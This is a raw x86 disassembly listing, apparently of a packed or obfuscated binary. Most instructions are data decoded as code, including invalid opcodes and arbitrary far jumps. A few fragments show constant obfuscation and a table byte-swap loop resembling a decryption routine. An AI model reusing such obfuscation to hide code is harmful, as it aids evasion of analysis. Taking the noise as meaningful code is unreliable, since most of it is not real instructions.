  40c0cd:	add    DWORD PTR [esi],ecx
  40c0cf:	pop    edx
  40c0d0:	add    dh,0xf6
  40c0d3:	adc    dl,BYTE PTR [ecx-0x2d]
  40c0d6:	xchg   edx,edi
  40c0d8:	mov    bl,0xf8
  40c0da:	jmp    0x40c14b
  40c0dc:	inc    esp
  40c0dd:	aam    0xe2
  40c0df:	and    DWORD PTR [esi+0x72],esi
  40c0e2:	xchg   ebp,eax
  40c0e3:	add    eax,0x23d7e94e
  40c0e8:	sbb    DWORD PTR [ebx+0x42],esp
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	ds mov cx,dx
  40c144:	sub    esp,DWORD PTR ds:0x708b2e57
  40c14a:	jo     0x40c0eb
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c135
  40c150:	fdiv   st(5),st
  40c152:	cld    
  40c153:	shr    DWORD PTR [eax-0xcde8276],cl
  40c159:	mov    esi,0x73ba5b10
  40c15e:	(bad)
  40c161:	add    DWORD PTR [ebx+0x72d2154d],ebx
  40c167:	xlat   BYTE PTR ds:[ebx]
  40c168:	push   ss
  40c169:	mov    dh,0xf0
  40c16b:	xchg   ebx,eax
  40c16c:	push   edi
  40c16d:	push   ebp
  40c16e:	ins    BYTE PTR es:[edi],dx
  40c16f:	adc    eax,0xac5c717f
  40c174:	in     al,dx
  40c175:	ret    
  40c176:	fdiv   st,st(1)
  40c178:	xor    BYTE PTR [edi],0x38
  40c17b:	jp     0x40c16a
  40c17d:	mov    al,0xbc
  40c17f:	and    eax,0x3ef6ab3d
  40c184:	jbe    0x40c189
  40c186:	iret   
  40c187:	addr16 mov esp,0x67473b98
  40c18d:	mov    ch,0xec
  40c18f:	jge    0x40c1e1
  40c191:	fwait
  40c192:	int3   
  40c193:	int3   
  40c194:	and    ecx,ecx
  40c196:	xchg   ebx,eax
  40c197:	push   esi
  40c198:	in     eax,dx
  40c199:	pop    ds
  40c19a:	repz and ecx,0xffffff9b
  40c19e:	pop    edx
  40c19f:	sub    DWORD PTR [esi+0x33],ebp
  40c1a2:	mov    DWORD PTR [eax-0x1e60b74a],edx
  40c1a8:	pop    esp
  40c1a9:	fst    QWORD PTR [ecx]
  40c1ab:	jecxz  0x40c15e
  40c1ad:	jnp    0x40c1d1
  40c1af:	shl    BYTE PTR [ebp+edi*2+0x1ad8305b],cl
  40c1b6:	dec    edx
  40c1b7:	rep outs dx,BYTE PTR ds:[esi]
  40c1b9:	rol    DWORD PTR [esi+eiz*2],1
  40c1bc:	ret    0x915
  40c1bf:	xchg   ebp,eax
  40c1c0:	push   ss
  40c1c1:	dec    ebx
  40c1c2:	out    dx,eax
  40c1c3:	adc    al,0xb8
  40c1c5:	inc    esp
  40c1c6:	sub    al,0x80
  40c1c8:	mov    WORD PTR [edx-0x39d41a04],fs
  40c1ce:	aad    0x3a
  40c1d0:	mov    al,0xaa
  40c1d2:	ficom  DWORD PTR [ecx+0x61]
  40c1d5:	and    ebx,DWORD PTR [esp+edx*8-0x13]
  40c1d9:	aaa    
  40c1da:	mov    ah,0xcf
  40c1dc:	les    esp,FWORD PTR [edi]
  40c1de:	xchg   esi,eax
  40c1df:	xor    dl,bh
  40c1e1:	bound  ebx,QWORD PTR [edi-0x5d795487]
  40c1e7:	fnstenv ds:0x524097d1
  40c1ed:	mov    eax,0xac97649a
  40c1f2:	mov    ebx,DWORD PTR [esi-0x65]
  40c1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f6:	popa   
  40c1f7:	and    ah,BYTE PTR [edx-0xd]
  40c1fa:	and    bh,BYTE PTR [edi-0xc6ebb3b]
  40c200:	xor    eax,0xb2d4476f
  40c205:	jmp    0x73e2:0x3002c891
  40c20c:	mov    edi,0x80ffe71e
  40c211:	mov    al,0x9
  40c213:	or     esi,ebx
  40c215:	sub    eax,0x48024d70
  40c21a:	mov    ds,WORD PTR [edi-0x58]
  40c21d:	loop   0x40c28b
  40c21f:	popf   
  40c220:	(bad)  
  40c221:	fiadd  WORD PTR [ebp+0x21]
  40c224:	test   DWORD PTR [esi-0x168ec8eb],esi
  40c22a:	ror    BYTE PTR [edi],1
  40c22c:	loope  0x40c273
  40c22e:	fst    DWORD PTR [esi+0x4e]
  40c231:	and    DWORD PTR [ebx-0x78f6f14a],0xd56c5287
  40c23b:	push   cs
  40c23c:	jge    0x40c231
  40c23e:	fdiv   QWORD PTR [ebp-0x7251f57c]
  40c244:	mov    cl,ah
  40c246:	jb     0x40c22c
  40c248:	xor    dh,BYTE PTR fs:[edi+eax*1+0x7b]
  40c24d:	cmc    
  40c24e:	sub    ah,bh
  40c250:	adc    eax,0x9c7892c7
  40c255:	adc    edx,ebp
  40c257:	sti    
  40c258:	fwait
  40c259:	mov    edi,0xdba2fd90
  40c25e:	rol    ebx,0x53
  40c261:	add    BYTE PTR [edx],dl
  40c263:	(bad)  
  40c264:	fwait
  40c265:	ds pushf 
  40c267:	push   edx
  40c268:	inc    ecx
  40c269:	hlt    
  40c26a:	fadd   QWORD PTR gs:[ecx]
  40c26d:	int    0xa0
  40c26f:	push   cs
  40c270:	sub    eax,0x139b58a
  40c275:	jns    0x40c28a
  40c277:	mov    dl,0xc1
  40c279:	push   ds
  40c27a:	sbb    al,0xf5
  40c27c:	and    eax,0x7769c449
  40c281:	in     eax,0xcc
  40c283:	je     0x40c257
  40c285:	push   ds
  40c286:	add    al,0xf7
  40c288:	xor    eax,0x5c5e5cce
  40c28d:	leave  
  40c28e:	scas   eax,DWORD PTR es:[edi]
  40c28f:	xchg   ecx,eax
  40c290:	hlt    
  40c291:	inc    esi
  40c292:	ror    BYTE PTR [eax-0x5be5a1fe],0x5a
  40c299:	arpl   WORD PTR [esi],ax
  40c29b:	inc    BYTE PTR [ecx+0x58cce609]
  40c2a1:	add    al,0xa8
  40c2a3:	fwait
  40c2a4:	daa    
  40c2a5:	sub    cl,BYTE PTR [edx-0xb]
  40c2a8:	mov    eax,0x8a320cbd
  40c2ad:	add    eax,0x520c9db0
  40c2b2:	pop    edi
  40c2b3:	int    0xfe
  40c2b5:	jge    0x40c314
  40c2b7:	lds    eax,FWORD PTR [edx-0x5a]
  40c2ba:	pop    edx
  40c2bb:	xor    bl,BYTE PTR [esi]
  40c2bd:	dec    edi
  40c2be:	mov    dl,0x72
  40c2c0:	mov    eax,0x90e34c11
  40c2c5:	pusha  
  40c2c6:	pop    esi
  40c2c7:	ret    0xdb3d
  40c2ca:	clc    
  40c2cb:	aaa    
  40c2cc:	jnp    0x40c2f6
  40c2ce:	push   ds
  40c2cf:	les    edi,FWORD PTR [ecx-0x1d729a83]
  40c2d5:	dec    esp
  40c2d6:	shl    DWORD PTR [esi+0x6d],cl
  40c2d9:	mov    ah,0x17
  40c2db:	cmp    DWORD PTR [ebx+0x2e849841],edx
  40c2e1:	inc    ecx
  40c2e2:	mov    ds:0x4f04e180,eax
  40c2e7:	inc    eax
  40c2e8:	jnp    0x40c31f
  40c2ea:	fstp   QWORD PTR [ebx]
  40c2ec:	cs xchg esi,eax
  40c2ee:	retf   0x93b5
  40c2f1:	scas   eax,DWORD PTR es:[edi]
  40c2f2:	or     bh,ch
  40c2f4:	and    eax,0xb06bac3
  40c2f9:	add    al,0x2c
  40c2fb:	test   BYTE PTR [eax],dh
  40c2fd:	mov    ah,0x2d
  40c2ff:	loope  0x40c30e
  40c301:	(bad)  
  40c302:	add    eax,0xfe5c138e
  40c307:	xor    eax,0x7ee2704
  40c30c:	xchg   BYTE PTR [esi+0x1a],dh
  40c30f:	addr16 addr16 daa 
  40c312:	sbb    ah,BYTE PTR ds:0x34163b8f
  40c318:	cwde   
  40c319:	mov    dh,0xcf
  40c31b:	test   eax,0x84062a4d
  40c320:	sub    ecx,DWORD PTR ds:0x8a404c30
  40c326:	lock mov esi,ecx
  40c329:	pop    ss
  40c32a:	nop
  40c32b:	xor    esi,DWORD PTR [ebp+0x1ec9db9]
  40c331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c332:	cs leave 
  40c334:	mov    ch,0xce
  40c336:	in     eax,0x88
  40c338:	xchg   BYTE PTR [esi+0x70],dh
  40c33b:	dec    BYTE PTR [edi]
  40c33d:	into   
  40c33e:	das    
  40c33f:	ret    0x9bf2
  40c342:	dec    esi
  40c343:	out    dx,eax
  40c344:	or     eax,0xb3411a7f
  40c349:	lahf   
  40c34a:	and    BYTE PTR [ebx],dh
  40c34c:	bound  ebx,QWORD PTR es:[ebp+0x6e]
  40c350:	or     eax,0x8aad1797
  40c355:	les    ebx,FWORD PTR [edi+0x1c11e660]
  40c35b:	adc    ecx,esi
  40c35d:	aam    0x70
  40c35f:	mov    dh,0x54
  40c361:	gs ss loop 0x40c2f9
  40c365:	pop    ebx
  40c366:	shr    DWORD PTR [ebp-0x24],1
  40c369:	push   eax
  40c36a:	xchg   esi,eax
  40c36b:	ret    
  40c36c:	dec    ebp
  40c36d:	inc    edi
  40c36e:	rcr    BYTE PTR [edx+0x1b],1
  40c371:	mov    eax,ds:0x3ea07873
  40c376:	pop    es
  40c377:	lahf   
  40c378:	and    eax,0xab0187f9
  40c37d:	cs rcl esp,1
  40c380:	cmp    BYTE PTR [ecx+0x5e4c81e7],cl
  40c386:	sbb    eax,0x8c70c6fd
  40c38b:	cmp    DWORD PTR [esi+0x9],esp
  40c38e:	inc    eax
  40c38f:	popa   
  40c390:	cmp    al,0xf8
  40c392:	pop    edi
  40c393:	add    al,0x89
  40c395:	xor    al,0xca
  40c397:	add    DWORD PTR ds:0x72725bb6,0xe8110791
  40c3a1:	fisttp DWORD PTR [edx-0x35]
  40c3a4:	inc    ebx
  40c3a5:	psllq  mm7,QWORD PTR [ecx-0x37]
  40c3a9:	gs mov cs,eax
  40c3ac:	les    edi,FWORD PTR [eax-0x73]
  40c3af:	ins    DWORD PTR es:[edi],dx
  40c3b0:	jmp    0xcfa5:0x5cea9e79
  40c3b7:	or     DWORD PTR [ecx-0x2e3c4b66],eax
  40c3bd:	xlat   BYTE PTR ds:[ebx]
  40c3be:	ror    ecx,cl
  40c3c0:	stc    
  40c3c1:	xchg   esp,eax
  40c3c2:	or     DWORD PTR [ecx+0x7a53eb50],eax
  40c3c8:	(bad)  
  40c3ca:	and    bh,BYTE PTR [esi]
  40c3cc:	jno    0x40c3d4
  40c3ce:	inc    esp
  40c3cf:	stc    
  40c3d0:	mov    ecx,0xd4bd775e
  40c3d5:	mov    BYTE PTR [esi],bl
  40c3d7:	arpl   WORD PTR [esi-0x6c],bp
  40c3da:	(bad)  
  40c3db:	sbb    bh,bh
  40c3dd:	clc    
  40c3de:	jl     0x40c3fe
  40c3e0:	loopne 0x40c377
  40c3e2:	enter  0x117a,0x51
  40c3e6:	icebp  
  40c3e7:	inc    edi
  40c3e8:	jae    0x40c3c1
  40c3ea:	loop   0x40c433
  40c3ec:	test   dl,cl
  40c3ee:	gs sti 
  40c3f0:	mov    dh,0x51
  40c3f2:	icebp  
  40c3f3:	not    BYTE PTR [edx-0x37]
  40c3f6:	jo     0x40c3a3
  40c3f8:	sub    dl,BYTE PTR [ebp+eax*8+0x7c]
  40c3fc:	rcl    DWORD PTR [ecx],0x34
  40c3ff:	push   esp
  40c400:	mov    esi,0x49e415c9
  40c405:	js     0x40c42d
  40c407:	pop    ds
  40c408:	sub    al,dh
  40c40a:	daa    
  40c40b:	iret   
  40c40c:	cmp    bl,cl
  40c40e:	jns    0x40c46e
  40c410:	push   0x4e816501
  40c415:	lods   al,BYTE PTR ds:[esi]
  40c416:	jnp    0x40c3dd
  40c418:	or     dh,ah
  40c41a:	and    BYTE PTR [edi],dh
  40c41c:	mov    ebx,0xf5dcff4a
  40c421:	mov    edx,0x6ca3830e
  40c426:	sbb    DWORD PTR [eax-0x3a6d134f],ebp
  40c42c:	inc    edi
  40c42d:	repz je 0x40c408
  40c430:	outs   dx,BYTE PTR ds:[esi]
  40c431:	add    dh,cl
  40c433:	test   DWORD PTR [ecx],0xb9637fa
  40c439:	aas    
  40c43a:	cmp    ecx,DWORD PTR ds:0xc434ed52
  40c440:	push   es
  40c441:	div    DWORD PTR [eax+0x5]
  40c444:	push   es
  40c445:	loop   0x40c452
  40c447:	in     eax,0x44
  40c449:	xchg   esi,eax
  40c44a:	fwait
  40c44b:	dec    edi
  40c44c:	mov    dh,0xb7
  40c44e:	inc    esp
  40c44f:	data16 rol BYTE PTR [edi+0x2e2b24f5],0xcd
  40c457:	push   cs
  40c458:	out    0x6d,eax
  40c45a:	test   WORD PTR [eax+edi*8-0xc],ax
  40c45f:	hlt    
  40c460:	mov    ch,0xaf
  40c462:	jo     0x40c4d9
  40c464:	cmp    eax,0x8695e8d8
  40c469:	popf   
  40c46a:	imul   esp,esp,0x69a94a4c
  40c470:	loope  0x40c4da
  40c472:	dec    edi
  40c473:	xchg   edx,eax
  40c474:	jmp    0x2d5d:0x55e0493a
  40c47b:	mov    edi,0x6ebcd65
  40c480:	add    eax,0xfa02650c
  40c485:	scas   al,BYTE PTR es:[edi]
  40c486:	into   
  40c487:	xchg   esi,eax
  40c488:	outs   dx,DWORD PTR ds:[esi]
  40c489:	mov    cl,BYTE PTR [ecx+0x4f88a34c]
  40c48f:	sbb    BYTE PTR [eax-0x7c],0x69
  40c493:	neg    DWORD PTR ds:0x93051e0f
  40c499:	aad    0x96
  40c49b:	dec    ebp
  40c49c:	test   BYTE PTR [edi+0xd],dl
  40c49f:	add    eax,0xcd92f025
  40c4a4:	xor    BYTE PTR [eax+esi*8+0x1b],0x3f
  40c4a9:	cdq    
  40c4aa:	push   esp
  40c4ab:	jg     0x40c489
  40c4ad:	cli    
  40c4ae:	ja     0x40c4da
  40c4b0:	push   bp
  40c4b2:	cli    
  40c4b3:	adc    bx,cx
  40c4b6:	loope  0x40c495
  40c4b8:	pop    es
  40c4b9:	pusha  
  40c4ba:	pop    ebp
  40c4bb:	lods   eax,DWORD PTR ds:[esi]
  40c4bc:	leave  
  40c4bd:	pop    ebx
  40c4be:	(bad)  
  40c4bf:	xchg   edx,eax
  40c4c0:	test   BYTE PTR [esp+ebp*8-0x5a9315b],al
  40c4c7:	dec    edx
  40c4c8:	fs pop ecx
  40c4ca:	call   0xff27:0xc714440
  40c4d1:	sub    al,0x43
  40c4d3:	call   0xdb94:0x3ec34326
  40c4da:	cmp    al,0xaf
  40c4dc:	sbb    eax,esp
  40c4de:	inc    ebp
  40c4df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4e0:	cmp    al,0x8e
  40c4e2:	push   0x59a890d6
  40c4e7:	arpl   WORD PTR [esi-0x57],di
  40c4ea:	fistp  DWORD PTR [ebp+0x7c]
  40c4ed:	cdq    
  40c4ee:	inc    esi
  40c4ef:	inc    eax
  40c4f0:	xor    edx,eax
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	out    0x6d,al
  40c542:	inc    edx
  40c543:	aaa    
  40c544:	dec    ebp
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c590
  40c54d:	push   ss
  40c54e:	mov    ah,0x3
  40c550:	imul   esp,DWORD PTR [ebx+0xc78cfb8],0xffffff83
  40c557:	jmp    0xaa30:0x4b01c5dd
  40c55e:	pop    eax
  40c55f:	add    eax,DWORD PTR [ecx+0x637f53ed]
  40c565:	stos   DWORD PTR es:[edi],eax
  40c566:	xor    dl,al
  40c568:	dec    ebp
  40c569:	cmp    al,0x58
  40c56b:	mov    ebx,0x1fcb6696
  40c570:	inc    esi
  40c572:	aad    0x21
  40c574:	outs   dx,BYTE PTR ds:[esi]
  40c575:	ds (bad) 
  40c577:	repz (bad) 
  40c579:	cld    
  40c57a:	out    0x27,eax
  40c57c:	jnp    0x40c53f
  40c57e:	mov    ch,0x4f
  40c580:	mov    ds:0xe60d1c2d,eax
  40c585:	push   cs
  40c586:	or     DWORD PTR ds:0xd8d39e2a,0xfffffffe
  40c58d:	jge    0x40c573
  40c58f:	das    
  40c590:	xchg   BYTE PTR [esi],cl
  40c592:	inc    esi
  40c593:	xlat   BYTE PTR ds:[ebx]
  40c594:	shl    BYTE PTR [edi+0x1a6d5357],cl
  40c59a:	xchg   al,bh
  40c59c:	addr16 pop ebp
  40c59e:	mov    ebp,0x144c344a
  40c5a3:	dec    edi
  40c5a4:	mov    ch,0xd4
  40c5a6:	call   0xbaac:0x7cb17b60
  40c5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ae:	mov    ah,0xf1
  40c5b0:	push   0x5d834eb7
  40c5b5:	pop    edx
  40c5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5b7:	and    BYTE PTR [eax],bh
  40c5b9:	in     al,0x6d
  40c5bb:	jbe    0x40c5f6
  40c5bd:	adc    al,0x43
  40c5bf:	and    esp,DWORD PTR [eax+0x2963d1f8]
  40c5c5:	mov    bh,0xb3
  40c5c7:	sub    ecx,esp
  40c5c9:	pop    ebp
  40c5ca:	scas   al,BYTE PTR es:[edi]
  40c5cb:	dec    ebx
  40c5cc:	ret    
  40c5cd:	mov    esp,0x3b52aa9a
  40c5d2:	bnd ret 0x2ae
  40c5d6:	popa   
  40c5d7:	push   ebx
  40c5d8:	test   esi,ecx
  40c5da:	outs   dx,DWORD PTR ds:[esi]
  40c5db:	out    dx,al
  40c5dc:	neg    BYTE PTR [eax+0x17d260ed]
  40c5e2:	add    al,BYTE PTR [edx+0x74]
  40c5e5:	hlt    
  40c5e6:	hlt    
  40c5e7:	mov    WORD PTR [eax+eax*4],ss
  40c5ea:	mov    al,BYTE PTR [esi-0x1df18bfd]
  40c5f0:	cmp    DWORD PTR [eax+ecx*2-0x5bb13b75],0xc3504460
  40c5fb:	ficomp WORD PTR [edx+0x3da3a865]
  40c601:	out    0xa0,eax
  40c603:	cmp    DWORD PTR [ebx],esi
  40c605:	push   ebx
  40c606:	sbb    ecx,DWORD PTR [eax+0x5e]
  40c609:	mov    ebx,0x473692
  40c60e:	ficomp WORD PTR [edi]
  40c610:	adc    DWORD PTR [esi],ebp
  40c612:	mov    al,ds:0x56a63d8f
  40c617:	es imul edi,ebp,0x499eec17
  40c61e:	dec    edx
  40c61f:	pop    eax
  40c620:	inc    edi
  40c621:	lock loope 0x40c5b4
  40c624:	retf   
  40c625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c626:	inc    ebp
  40c627:	mov    bl,0x9e
  40c629:	sub    BYTE PTR ds:0x291e366c,al
  40c62f:	mov    edi,0x55f80a2
  40c634:	fiadd  WORD PTR [edx]
  40c636:	push   ds
  40c637:	mov    bl,0x9b
  40c639:	or     DWORD PTR [ebx],edi
  40c63b:	int3   
  40c63c:	loop   0x40c5c8
  40c63e:	pop    es
  40c63f:	adc    BYTE PTR [esi+edx*8+0x7f5c25a6],dl
  40c646:	mov    DWORD PTR [ebp+0x51],ecx
  40c649:	gs and al,0x3e
  40c64c:	fldenv [esi+ecx*1+0x7575951a]
  40c653:	outs   dx,DWORD PTR ds:[esi]
  40c654:	inc    edi
  40c655:	mov    ebx,edx
  40c657:	adc    DWORD PTR [ecx+0x63],esp
  40c65a:	jge    0x40c651
  40c65c:	xor    dh,cl
  40c65e:	or     DWORD PTR [ebx-0x57],ebx
  40c661:	neg    esp
  40c663:	clc    
  40c664:	dec    edi
  40c665:	mov    edx,0xd1f38319
  40c66a:	ds inc edi
  40c66c:	dec    esi
  40c66d:	not    DWORD PTR ds:0x9ed8497d
  40c673:	loopne 0x40c684
  40c675:	cmp    edi,DWORD PTR [edi]
  40c677:	jns    0x40c6c6
  40c679:	repnz popa 
  40c67b:	adc    edx,edx
  40c67d:	fstp   QWORD PTR [edi]
  40c67f:	les    ebx,FWORD PTR [edx+0x3174263]
  40c685:	test   cl,0xc
  40c688:	dec    edx
  40c689:	rcl    ah,1
  40c68b:	xchg   edx,eax
  40c68c:	xchg   esi,eax
  40c68d:	mov    BYTE PTR [edx],dh
  40c68f:	sbb    dh,BYTE PTR [eax+eiz*1+0x14b75e31]
  40c696:	aas    
  40c697:	mov    cl,0x2b
  40c699:	test   eax,0xc7f93f8b
  40c69e:	inc    esp
  40c69f:	push   ds
  40c6a0:	mov    ds:0x26e29955,al
  40c6a5:	fs repz mov al,0xb8
  40c6a9:	ret    0xc134
  40c6ac:	jae    0x40c698
  40c6ae:	mov    esp,0xa4616c4f
  40c6b3:	mov    eax,ds:0xb72a4a67
  40c6b8:	or     BYTE PTR [ebp+0x62f04507],ah
  40c6be:	jns    0x40c6a3
  40c6c0:	mov    ds:0xd4d0892,al
  40c6c5:	add    eax,DWORD PTR [eax]
  40c6c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6c8:	add    eax,0xe35696bc
  40c6ce:	hlt    
  40c6cf:	fs nop
  40c6d1:	std    
  40c6d2:	jge    0x40c6c1
  40c6d4:	and    ah,al
  40c6d6:	inc    esi
  40c6d7:	iret   
  40c6d8:	cdq    
  40c6d9:	inc    edi
  40c6da:	or     cl,BYTE PTR [esi]
  40c6dc:	inc    ebp
  40c6dd:	mov    cl,0x3a
  40c6df:	je     0x40c757
  40c6e1:	cs jl  0x40c721
  40c6e4:	in     al,0xa8
  40c6e6:	sbb    eax,0x8d2d93e8
  40c6eb:	inc    edi
  40c6ec:	idiv   eax
  40c6ee:	xchg   esi,eax
  40c6ef:	cmp    eax,0xcf829366
  40c6f4:	mov    al,ds:0xa3ef6a07
  40c6f9:	aad    0x39
  40c6fb:	mov    ds:0x6e15c589,al
  40c700:	scas   eax,DWORD PTR es:[edi]
  40c701:	enter  0xdf11,0x3e
  40c705:	test   DWORD PTR [edx-0x5c7c3884],0x7483d23b
  40c70f:	push   eax
  40c710:	adc    DWORD PTR [ecx],edx
  40c712:	mov    dl,0x62
  40c714:	jecxz  0x40c707
  40c716:	sti    
  40c717:	outs   dx,DWORD PTR ds:[esi]
  40c718:	push   es
  40c719:	sub    dh,BYTE PTR [eax-0x3a760638]
  40c71f:	call   FWORD PTR [edi]
  40c721:	push   ss
  40c722:	cmp    esi,edx
  40c724:	push   ebx
  40c725:	outs   dx,BYTE PTR ds:[esi]
  40c726:	in     eax,dx
  40c727:	(bad)  
  40c728:	idiv   al
  40c72a:	push   esp
  40c72b:	neg    DWORD PTR [eax]
  40c72d:	push   ebx
  40c72e:	call   0xfb03:0x17fdd1a
  40c735:	cs iret 
  40c737:	xchg   DWORD PTR [edx+0x7e],edx
  40c73a:	stc    
  40c73b:	mov    eax,ds:0x6da77845
  40c740:	out    0xf7,al
  40c742:	add    ah,dh
  40c744:	xor    ah,bh
  40c746:	stos   BYTE PTR es:[edi],al
  40c747:	or     eax,0x80d7ebc5
  40c74c:	out    0xd9,eax
  40c74e:	push   esi
  40c74f:	mov    ch,BYTE PTR [ecx+0x64]
  40c752:	xchg   edi,eax
  40c753:	mov    ecx,0x2059356a
  40c758:	xor    DWORD PTR [edi-0xb],eax
  40c75b:	or     eax,0x281913a
  40c760:	add    ah,BYTE PTR [esi-0x6ff0a70f]
  40c766:	pusha  
  40c767:	inc    ebp
  40c768:	mov    ch,0xe7
  40c76a:	push   eax
  40c76b:	loopne 0x40c774
  40c76d:	mov    eax,0x5cca2f37
  40c772:	push   es
  40c773:	std    
  40c774:	in     eax,0xea
  40c776:	jnp    0x40c7f0
  40c778:	ss dec esi
  40c77a:	mov    gs,WORD PTR [edx+0x2c]
  40c77d:	es in  eax,dx
  40c77f:	mov    ecx,0x172bd69d
  40c784:	pop    edi
  40c785:	pop    ecx
  40c786:	loop   0x40c717
  40c788:	jmp    0x40c7e4
  40c78a:	shr    BYTE PTR [edi+0x1c],1
  40c78d:	shl    BYTE PTR [esi+0x58],0x9e
  40c791:	mov    edi,0x7d0e97ba
  40c796:	pushf  
  40c797:	mov    ebx,0x12d6abd1
  40c79c:	nop
  40c79d:	fnop   
  40c79f:	lock in al,dx
  40c7a1:	idiv   DWORD PTR [esi-0x45]
  40c7a4:	outs   dx,DWORD PTR ds:[esi]
  40c7a5:	bound  edi,QWORD PTR [esp+edi*1-0x3a]
  40c7a9:	jae    0x40c7d5
  40c7ab:	jnp    0x40c76a
  40c7ad:	ret    
  40c7ae:	mov    al,ds:0x6e8450c9
  40c7b3:	mov    dl,0x3f
  40c7b5:	jle    0x40c755
  40c7b7:	or     eax,0x39cb9a30
  40c7bc:	out    0xde,al
  40c7be:	or     DWORD PTR [ebp+0x50],0xb68a3f25
  40c7c5:	push   es
  40c7c6:	jno    0x40c7b0
  40c7c8:	(bad)  
  40c7c9:	push   esi
  40c7ca:	mov    ecx,0xd50d2b90
  40c7cf:	add    cl,BYTE PTR [esi-0x5d]
  40c7d2:	js     0x40c837
  40c7d4:	pop    esi
  40c7d5:	mov    dl,0x88
  40c7d7:	sub    BYTE PTR [edi+ebx*2-0x57],dh
  40c7db:	jb     0x40c84d
  40c7dd:	sbb    ebx,eax
  40c7df:	scas   eax,DWORD PTR es:[edi]
  40c7e0:	retf   
  40c7e1:	mov    edx,0xfd21e60e
  40c7e6:	or     eax,0x1aaabae2
  40c7eb:	inc    eax
  40c7ec:	mov    bh,0xb6
  40c7ee:	add    esi,DWORD PTR [edx+eax*8-0x5d]
  40c7f2:	mov    bl,0xff
  40c7f4:	adc    BYTE PTR [edx],ah
  40c7f6:	dec    esi
  40c7f7:	inc    edi
  40c7f8:	das    
  40c7f9:	sub    ch,BYTE PTR [ebp-0x7a3c74e3]
  40c7ff:	push   ds
  40c800:	mov    DWORD PTR ds:0x6edc96bf,esi
  40c806:	xchg   DWORD PTR [esi-0x4a869f8f],ebp
  40c80c:	in     al,0x20
  40c80e:	dec    esi
  40c80f:	sub    eax,0x77f90b11
  40c814:	fs in  eax,dx
  40c816:	mov    ebp,0x15642b64
  40c81b:	fldcw  WORD PTR [edi+0x6e]
  40c81e:	jmp    0x2621933d
  40c823:	sahf   
  40c824:	push   edi
  40c825:	out    dx,al
  40c826:	les    esp,FWORD PTR [edi]
  40c828:	scas   eax,DWORD PTR es:[edi]
  40c829:	or     ebx,edi
  40c82b:	dec    bl
  40c82d:	add    al,0x93
  40c82f:	ficom  DWORD PTR [ecx+0x1a02c496]
  40c835:	xchg   esp,eax
  40c836:	int3   
  40c837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c838:	sbb    eax,0xf2d16621
  40c83d:	dec    ebx
  40c83e:	pop    esp
  40c83f:	bound  eax,QWORD PTR [edx+0x36]
  40c842:	dec    edi
  40c843:	(bad)  
  40c844:	js     0x40c809
  40c846:	(bad)  
  40c847:	scas   eax,DWORD PTR es:[edi]
  40c848:	loopne 0x40c831
  40c84a:	in     eax,0xb
  40c84c:	fdiv   DWORD PTR [edx+edi*2]
  40c84f:	shl    DWORD PTR [edi-0x15],0x95
  40c853:	sbb    DWORD PTR [ecx-0x6d60d1ae],esp
  40c859:	sub    bh,BYTE PTR [ebp+0x2cd8e25c]
  40c85f:	loop   0x40c884
  40c861:	shl    edx,1
  40c863:	cs test eax,0x6b9fb4cd
  40c869:	sub    eax,0x33b03e73
  40c86e:	push   ebx
  40c86f:	add    ebp,ebx
  40c871:	mov    bl,0x89
  40c873:	xlat   BYTE PTR ds:[ebx]
  40c874:	sahf   
  40c875:	loop   0x40c829
  40c877:	inc    edx
  40c878:	inc    eax
  40c879:	mov    edx,0x59106fa5
  40c87e:	div    DWORD PTR [ecx-0x6633437f]
